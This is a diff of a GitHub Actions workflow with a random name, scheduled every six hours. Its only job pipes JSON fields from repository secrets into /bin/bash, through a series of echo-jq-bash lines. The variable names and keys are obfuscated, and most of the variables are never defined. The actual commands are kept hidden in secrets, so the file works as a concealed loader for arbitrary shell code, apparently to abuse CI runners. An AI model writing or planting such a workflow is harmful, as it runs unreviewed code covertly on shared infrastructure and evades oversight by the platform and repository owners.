@@ -1,26 +1,29 @@
 name: xuhaoran3871
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 0/6 * * *'
+    - cron: '35 2/6 * * *'
 
-jobs:  # 3422
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xuhaoran3871
         env:
-          clyyf5078: ${{ secrets.clyyf5078 }}
+          grk0023: ${{ secrets.grk0023 }}
         run: |
-          echo $clyyf5078 | jq -r .xjos73099 | /bin/bash
-          echo $xugx5528 | jq -r .s8 | /bin/bash
-          echo $xtrzr14791 | jq -r .kpvh5 | /bin/bash
-          echo $etgiq60653 | jq -r .flzyz31 | /bin/bash
-          echo $sshv484 | jq -r .ekxlb9736 | /bin/bash
-          echo $p70 | jq -r .vgdkt769 | /bin/bash
-          echo $nqcr92076 | jq -r .z0 | /bin/bash
-          echo $hw38 | jq -r .tog40989 | /bin/bash
+          echo $grk0023 | jq -r .ljjdo8 | /bin/bash
+          echo $i72764 | jq -r .f1094 | /bin/bash
+          echo $lx7586 | jq -r .r8 | /bin/bash
+          echo $dvz13636 | jq -r .kod9779 | /bin/bash
+          echo $feql0610 | jq -r .fvl84 | /bin/bash
+          echo $pnw02767 | jq -r .bdxw0081 | /bin/bash
+          echo $d18907 | jq -r .mg32224 | /bin/bash
+          echo $yi5613 | jq -r .xtccw8967 | /bin/bash
+          echo $bbgn25 | jq -r .j95 | /bin/bash
+          echo $uyldg392 | jq -r .i6 | /bin/bash
+          echo $cik83 | jq -r .ny343 | /bin/bash
+          echo $tdjv4697 | jq -r .oqy1336 | /bin/bash
+          echo $mk0787 | jq -r .vxj95 | /bin/bash
 
